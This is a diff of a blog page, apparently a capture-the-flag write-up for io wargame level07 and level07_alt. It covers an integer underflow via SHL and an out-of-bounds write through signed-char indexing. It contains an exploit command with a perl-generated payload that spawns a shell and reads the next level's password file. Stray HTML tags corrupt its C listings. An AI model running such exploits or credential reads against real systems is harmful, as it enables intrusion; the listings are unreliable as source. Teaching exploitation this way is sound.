+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb<span class="nv">$ </span>disas main
+</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
+</span><span class='line'>0x08048414 &amp;lt;main+0&gt;:    push   ebp
+</span><span class='line'>0x08048415 &amp;lt;main+1&gt;:    mov    ebp,esp
+</span><span class='line'>0x08048417 &amp;lt;main+3&gt;:    sub    esp,0x68
+</span><span class='line'>0x0804841a &amp;lt;main+6&gt;:    and    esp,0xfffffff0
+</span><span class='line'>0x0804841d &amp;lt;main+9&gt;:    mov    eax,0x0
+</span><span class='line'>0x08048422 &amp;lt;main+14&gt;:   sub    esp,eax
+</span><span class='line'>0x08048424 &amp;lt;main+16&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
+</span><span class='line'>0x08048427 &amp;lt;main+19&gt;:   add    eax,0x4
+</span><span class='line'>0x0804842a &amp;lt;main+22&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
+</span><span class='line'>0x0804842c &amp;lt;main+24&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span><span class='line'>0x0804842f &amp;lt;main+27&gt;:   call   0x8048354 &amp;lt;atoi@plt&gt;
+</span><span class='line'>0x08048434 &amp;lt;main+32&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,eax
+</span><span class='line'>0x08048437 &amp;lt;main+35&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x9
+</span><span class='line'>0x0804843b &amp;lt;main+39&gt;:   jle    0x8048446 &amp;lt;main+50&gt;
+</span><span class='line'>0x0804843d &amp;lt;main+41&gt;:   mov    DWORD PTR <span class="o">[</span>ebp-0x4c<span class="o">]</span>,0x1
+</span><span class='line'>0x08048444 &amp;lt;main+48&gt;:   jmp    0x80484ad &amp;lt;main+153&gt;
+</span><span class='line'>0x08048446 &amp;lt;main+50&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
+</span><span class='line'>0x08048449 &amp;lt;main+53&gt;:   shl    eax,0x2                          &lt;- here
+</span><span class='line'>0x0804844c &lt;main+56&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,eax
+</span><span class='line'>0x08048450 &amp;lt;main+60&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
+</span><span class='line'>0x08048453 &amp;lt;main+63&gt;:   add    eax,0x8
+</span><span class='line'>0x08048456 &amp;lt;main+66&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
+</span><span class='line'>0x08048458 &amp;lt;main+68&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+</span><span class='line'>0x0804845c &amp;lt;main+72&gt;:   lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
+</span><span class='line'>0x0804845f &amp;lt;main+75&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span><span class='line'>0x08048462 &amp;lt;main+78&gt;:   call   0x8048334 &amp;lt;memcpy@plt&gt;
+</span><span class='line'>0x08048467 &amp;lt;main+83&gt;:   cmp    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x574f4c46
+</span><span class='line'>0x0804846e &amp;lt;main+90&gt;:   jne    0x804849a &amp;lt;main+134&gt;
+</span><span class='line'>0x08048470 &amp;lt;main+92&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048584
+</span><span class='line'>0x08048477 &amp;lt;main+99&gt;:   call   0x8048344 &amp;lt;printf@plt&gt;
+</span><span class='line'>0x0804847c &amp;lt;main+104&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x0
+</span><span class='line'>0x08048484 &amp;lt;main+112&gt;:  mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x804858a
+</span><span class='line'>0x0804848c &amp;lt;main+120&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804858d
+</span><span class='line'>0x08048493 &amp;lt;main+127&gt;:  call   0x8048324 &amp;lt;execl@plt&gt;
+</span><span class='line'>0x08048498 &amp;lt;main+132&gt;:  jmp    0x80484a6 &amp;lt;main+146&gt;
+</span><span class='line'>0x0804849a &amp;lt;main+134&gt;:  mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048595
+</span><span class='line'>0x080484a1 &amp;lt;main+141&gt;:  call   0x8048344 &amp;lt;printf@plt&gt;
+</span><span class='line'>0x080484a6 &amp;lt;main+146&gt;:  mov    DWORD PTR <span class="o">[</span>ebp-0x4c<span class="o">]</span>,0x0
+</span><span class='line'>0x080484ad &amp;lt;main+153&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp-0x4c<span class="o">]</span>
+</span><span class='line'>0x080484b0 &amp;lt;main+156&gt;:  leave&lt;br/&gt;
+</span><span class='line'>0x080484b1 &amp;lt;main+157&gt;:  ret  &lt;br/&gt;
+</span><span class='line'>End of assembler dump.
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Some investigation of the behaviour of this instruction lead me to realise that there was room for abuse when values over/underflow. If we use <code>SHL</code> with numbers of a small enough negative value, those values become positive. Let's have a look at that in action by whipping up a sample program and viewing the output:</p>
 
-<p>{% codeblock Testing Shifts Source lang:c %}
-int main(int argc, char **argv)
-{</p>
-
-<pre><code>int x = -2147483647;
-printf("%p\n", x);
-printf("%p\n", x &lt;&lt; 2);
-printf("%p\n", (x + 16) &lt;&lt; 2);
-printf("%p\n", (x + 32) &lt;&lt; 2);
-return 0;
-</code></pre>
-
-<p>}
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Testing Shifts Source  </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2147483647</span><span class="p">;</span>
+</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
+</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">2</span><span class="p">);</span>
+</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">2</span><span class="p">);</span>
+</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">2</span><span class="p">);</span>
+</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Compile this code with <code>gcc</code> and run it, and you'll find the following:</p>
 
-<p>{% codeblock Testing Shifts lang:bash %}
-level7@io:/tmp/tc7$ ./a.out
-0x80000001
-0x4
-0x44
-0x84
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Testing Shifts  </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:/tmp/tc7<span class="nv">$ </span>./a.out
+</span><span class='line'>0x80000001
+</span><span class='line'>0x4
+</span><span class='line'>0x44
+</span><span class='line'>0x84
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>So we can pass in a negative integer, have it shift and turn it into a positive that's big enough to overflow the buffer. Once we've overflowed, all we need to do is write the value <code>0x574f4c46</code> to the desired memory location and the level will pass. We can get smart and figure out exactly where this needs to be, or we can go with the approach of repeatedly writing it knowing that somewhere along the line it'll end up being written to where we need it to be: in the <code>count</code> varaible. I chose to do the latter. We pass this data in as the second argument on the command line. Let's see how this looks:</p>
 
-<p>{% codeblock Exploit Run lang:bash %}
-level7@io:$ /levels/level07 -2147483600 <code>perl -e 'print "\x46\x4c\x4f\x57" x 100'</code>
-WIN!
-sh-4.1$ cat /home/level8/.pass
-&lt;&lt; -- password was printed here -- >>
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Exploit Run  </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:<span class="nv">$ </span>/levels/level07 -2147483600 &lt;code&gt;perl -e <span class="s1">&#39;print &quot;\x46\x4c\x4f\x57&quot; x 100&#39;</span>&lt;/code&gt;
+</span><span class='line'>WIN!
+</span><span class='line'>sh-4.1<span class="nv">$ </span>cat /home/level8/.pass
+</span><span class='line'>&amp;lt;&amp;lt; -- password was printed here -- &gt;&gt;
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>This level was relatively simple, but was good exposure to the idea of how integer underflows can cause problems.</p>
 
@@ -780,221 +971,416 @@ sh-4.1$ cat /home/level8/.pass
 
 <p>Let's start with the source of the alternate application, modified a little by me (and highlighted):</p>
 
-<p>{% codeblock level07_alt.c lang:c %}
-/*</p>
-
-<pre><code>Coding by LarsH
-
-PJYN GIEZIRC FRD RBNE OM QNML PE ZMP PJM BMPPMI AIMHQMDFYMN AIEC R PMUP,
-this program can also be used to get the letter frequencies from a text  &lt;-- I added this
-TJYFJ JMBGN TJMD FIRFWYDZ NPRDLRIL CEDENQONPYPQPYED FYGJMIN.
-which helps when cracking standard monosubstitution ciphers              &lt;-- I added this
-</code></pre>
-
-<p>*/</p>
-
-<h1>include &lt;stdio.h></h1>
-
-<p>static int count[256];</p>
-
-<p>int main(int argc, char **argv) {</p>
-
-<pre><code>int i, j;
-
-if(argc == 1) {
-    printf("Usage: %s words\n", argv[0]);
-    return 1;
-}
-
-/* Clear out the frequency buffer */
-for(i=0; i&lt;256; i++)
-    count[i] = 0;
-
-/* Fill the frequency buffer */
-for(j=1; argv[j]; j++)
-    for(i=0; argv[j][i]; i++)
-        count[argv[j][i]]++;
-
-/* Print out the frequency buffer */
-for(i=0; i&lt;256; i++)
-    if(count[i])
-        printf("%c found %i time%s\n", i, count[i], count[i]-1?"s":"");
-
-return 0;
-</code></pre>
-
-<p>}
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>level07_alt.c  </span></figcaption>
+ <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">&lt;pre&gt;&lt;code&gt;Coding by LarsH</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">PJYN GIEZIRC FRD RBNE OM QNML PE ZMP PJM BMPPMI AIMHQMDFYMN AIEC R PMUP,</span>
+</span><span class='line'><span class="cm">this program can also be used to get the letter frequencies from a text  &amp;lt;-- I added this</span>
+</span><span class='line'><span class="cm">TJYFJ JMBGN TJMD FIRFWYDZ NPRDLRIL CEDENQONPYPQPYED FYGJMIN.</span>
+</span><span class='line'><span class="cm">which helps when cracking standard monosubstitution ciphers              &amp;lt;-- I added this</span>
+</span><span class='line'><span class="cm">&lt;/code&gt;&lt;/pre&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">&lt;p&gt;*/</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">static</span> <span class="kt">int</span> <span class="n">count</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: %s words</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">/* Clear out the frequency buffer */</span>
+</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">/* Fill the frequency buffer */</span>
+</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">];</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">];</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span><span class='line'>        <span class="n">count</span><span class="p">[</span><span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">]]</span><span class="o">++</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cm">/* Print out the frequency buffer */</span>
+</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%c found %i time%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">count</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="o">?</span><span class="s">&quot;s&quot;</span><span class="o">:</span><span class="s">&quot;&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>On the surface it's hard to see where this application could be attacked! It's one of those bit of code that seems rather non-descript, yes has a very subtle issue in it which will allow us to gain some form of control. The obvious thing to look for is where memory is modified as a result of our user input, and this leads us to the following line:</p>
 
-<p>{% codeblock lang:c %}
-count[argv[j][i]]++;
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">count</span><span class="p">[</span><span class="n">argv</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">]]</span><span class="o">++</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Here the code is using the <code>j</code>th word (passed in on the command line via <code>argv</code>) and accessing its <code>i</code>th character, then using this character as an index into <code>count</code> to increment the count for that letter. The application is obviously doing a simple letter-tally. Straight up this looks like a potential point of attack because the values in <code>argv</code> are <em>signed</em> characters, and hence we can pass in values that are <strong>negative</strong> and write outside the bounds of the <code>count</code> array. Let's <code>objdump</code> the binary to see where <code>count</code> lives:</p>
 
-<p>{% codeblock lang:bash %}
-$ objdump -D /levels/level07_alt | grep count
-08049720 <count>:
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>objdump -D /levels/level07_alt | grep count
+</span><span class='line'>08049720 &lt;count&gt;:
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>The negative values we can use are from <code>CHAR_MIN</code> (<code>-128</code>) &times; <code>sizeof(int)</code> (<code>4</code> on a 32-bit system) to <code>0</code>. So with <code>count</code> located at <code>0x8049720</code>, it means we can write values from here, all the way back to <code>0x8049520</code>. Let's see what fits within this range, again by looking at the output of <code>objdump</code>:</p>
 
-<p>{% codeblock lang:bash %}
-$ objdump -D /levels/level07_alt
-... snip ...</p>
-
-<p>Disassembly of section .ctors:</p>
-
-<p>080495ec <__CTOR_LIST__>:
- 80495ec:   ff                      (bad)<br/>
- 80495ed:   ff                      (bad)<br/>
- 80495ee:   ff                      (bad)<br/>
- 80495ef:   ff 00                   incl   (%eax)</p>
-
-<p>080495f0 <__CTOR_END__>:
- 80495f0:   00 00                   add    %al,(%eax)
-  ...</p>
-
-<p>Disassembly of section .dtors:</p>
-
-<p>080495f4 <__DTOR_LIST__>:
- 80495f4:   ff                      (bad)<br/>
- 80495f5:   ff                      (bad)<br/>
- 80495f6:   ff                      (bad)<br/>
- 80495f7:   ff 00                   incl   (%eax)</p>
-
-<p>080495f8 <__DTOR_END__>:
- 80495f8:   00 00                   add    %al,(%eax)
-  ...</p>
-
-<p>Disassembly of section .jcr:</p>
-
-<p>080495fc <__JCR_END__>:
- 80495fc:   00 00                   add    %al,(%eax)
-  ...</p>
-
-<p>Disassembly of section .dynamic:</p>
-
-<p>08049600 <_DYNAMIC>:
- 8049600:   01 00                   add    %eax,(%eax)
- 8049602:   00 00                   add    %al,(%eax)
- 8049604:   10 00                   adc    %al,(%eax)
- 8049606:   00 00                   add    %al,(%eax)
- 8049608:   0c 00                   or     $0x0,%al
- 804960a:   00 00                   add    %al,(%eax)
- 804960c:   78 82                   js     8049590 &lt;<strong>FRAME_END</strong>+0xfa8>
- 804960e:   04 08                   add    $0x8,%al
- 8049610:   0d 00 00 00 9c          or     $0x9c000000,%eax
- 8049615:   85 04 08                test   %eax,(%eax,%ecx,1)
- 8049618:   04 00                   add    $0x0,%al
- 804961a:   00 00                   add    %al,(%eax)
- 804961c:   48                      dec    %eax
- 804961d:   81 04 08 f5 fe ff 6f    addl   $0x6ffffef5,(%eax,%ecx,1)
- 8049624:   70 81                   jo     80495a7 &lt;<strong>FRAME_END</strong>+0xfbf>
- 8049626:   04 08                   add    $0x8,%al
- 8049628:   05 00 00 00 e0          add    $0xe0000000,%eax
- 804962d:   81 04 08 06 00 00 00    addl   $0x6,(%eax,%ecx,1)
- 8049634:   90                      nop
- 8049635:   81 04 08 0a 00 00 00    addl   $0xa,(%eax,%ecx,1)
- 804963c:   4c                      dec    %esp
- 804963d:   00 00                   add    %al,(%eax)
- 804963f:   00 0b                   add    %cl,(%ebx)
- 8049641:   00 00                   add    %al,(%eax)
- 8049643:   00 10                   add    %dl,(%eax)
- 8049645:   00 00                   add    %al,(%eax)
- 8049647:   00 15 00 00 00 00       add    %dl,0x0
- 804964d:   00 00                   add    %al,(%eax)
- 804964f:   00 03                   add    %al,(%ebx)
- 8049651:   00 00                   add    %al,(%eax)
- 8049653:   00 d4                   add    %dl,%ah
- 8049655:   96                      xchg   %eax,%esi
- 8049656:   04 08                   add    $0x8,%al
- 8049658:   02 00                   add    (%eax),%al
- 804965a:   00 00                   add    %al,(%eax)
- 804965c:   18 00                   sbb    %al,(%eax)
- 804965e:   00 00                   add    %al,(%eax)
- 8049660:   14 00                   adc    $0x0,%al
- 8049662:   00 00                   add    %al,(%eax)
- 8049664:   11 00                   adc    %eax,(%eax)
- 8049666:   00 00                   add    %al,(%eax)
- 8049668:   17                      pop    %ss
- 8049669:   00 00                   add    %al,(%eax)
- 804966b:   00 60 82                add    %ah,-0x7e(%eax)
- 804966e:   04 08                   add    $0x8,%al
- 8049670:   11 00                   adc    %eax,(%eax)
- 8049672:   00 00                   add    %al,(%eax)
- 8049674:   58                      pop    %eax
- 8049675:   82                      (bad)<br/>
- 8049676:   04 08                   add    $0x8,%al
- 8049678:   12 00                   adc    (%eax),%al
- 804967a:   00 00                   add    %al,(%eax)
- 804967c:   08 00                   or     %al,(%eax)
- 804967e:   00 00                   add    %al,(%eax)
- 8049680:   13 00                   adc    (%eax),%eax
- 8049682:   00 00                   add    %al,(%eax)
- 8049684:   08 00                   or     %al,(%eax)
- 8049686:   00 00                   add    %al,(%eax)
- 8049688:   fe                      (bad)<br/>
- 8049689:   ff                      (bad)<br/>
- 804968a:   ff 6f 38                ljmp   <em>0x38(%edi)
- 804968d:   82                      (bad)<br/>
- 804968e:   04 08                   add    $0x8,%al
- 8049690:   ff                      (bad)<br/>
- 8049691:   ff                      (bad)<br/>
- 8049692:   ff 6f 01                ljmp   </em>0x1(%edi)
- 8049695:   00 00                   add    %al,(%eax)
- 8049697:   00 f0                   add    %dh,%al
- 8049699:   ff                      (bad)<br/>
- 804969a:   ff 6f 2c                ljmp   *0x2c(%edi)
- 804969d:   82                      (bad)<br/>
- 804969e:   04 08                   add    $0x8,%al
-  ...</p>
-
-<p>Disassembly of section .got:</p>
-
-<p>080496d0 &lt;.got>:
- 80496d0:   00 00                   add    %al,(%eax)
-  ...</p>
-
-<p>Disassembly of section .got.plt:</p>
-
-<p>080496d4 <_GLOBAL_OFFSET_TABLE_>:
- 80496d4:   00 96 04 08 00 00       add    %dl,0x804(%esi)
- 80496da:   00 00                   add    %al,(%eax)
- 80496dc:   00 00                   add    %al,(%eax)
- 80496de:   00 00                   add    %al,(%eax)
- 80496e0:   be 82 04 08 ce          mov    $0xce080482,%esi
- 80496e5:   82                      (bad)<br/>
- 80496e6:   04 08                   add    $0x8,%al
- 80496e8:   de                      .byte 0xde
- 80496e9:   82                      (bad)<br/>
- 80496ea:   04 08                   add    $0x8,%al</p>
-
-<p>Disassembly of section .data:</p>
-
-<p>080496ec <__data_start>:
- 80496ec:   00 00                   add    %al,(%eax)
-  ...</p>
-
-<p>080496f0 <__dso_handle>:
- 80496f0:   00 00                   add    %al,(%eax)
-  ...</p>
-
-<p>Disassembly of section .bss:</p>
-
-<p>08049700 &lt;completed.5706>:
- 8049700:   00 00                   add    %al,(%eax)
-  ...</p>
-
-<p>08049704 &lt;dtor_idx.5708>:
-  ...</p>
-
-<p>08049720 <count>:
-  ...
-... snip ...
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
